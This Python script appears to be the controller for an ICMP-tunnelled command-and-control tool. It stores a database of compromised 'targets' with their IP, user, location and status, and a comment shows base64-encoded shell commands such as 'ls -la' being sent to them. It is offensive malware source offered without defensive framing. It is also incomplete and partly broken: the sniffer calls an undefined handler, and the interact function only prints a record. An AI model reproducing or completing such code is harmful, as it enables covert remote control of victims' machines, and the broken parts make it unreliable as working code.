#!/usr/bin/python3

# self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))

from scapy.all import sniff
import base64
from shellylib import Host
from tinydb import TinyDB, Query
import os
import sys
import time
import argparse

TTL = int(64)
ICMP_ID = int(12800)

class Controller(Host):
    
    def __init__(self):
        super().__init__()
        self.db = TinyDB('./db.json')

    def list_hosts(self):
        response = "[ Targets ]\n"

        Target = Query()
        targets = self.db.all()
        for target in targets:
            response += f" [*] {target['id']}\n"
            response += f" --> {target['ip']}\n"
            response += f" --> {target['iface']}\n"
            response += f" --> {target['mac']}\n"
            response += f" --> {target['user']}\n"
            response += f" --> {target['location']}\n"
            response += f" --> {target['status']}\n"
        
        return response

    def sniffer(self):
        sniff(iface=self.interface, prn=shell, filter="icmp", store="0")

    def interact(self, target):
        Target = Query()
        target = self.db.search(Target.id == target)
        print(target)

        # self.sniffing.start()
        # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")

    

if __name__ == "__main__":
    controller = Controller()
    

    match sys.argv[1]:
        case "ls":
            print(controller.list_hosts())
        case "interact":
            controller.interact(int(sys.argv[2]))

            
    
    
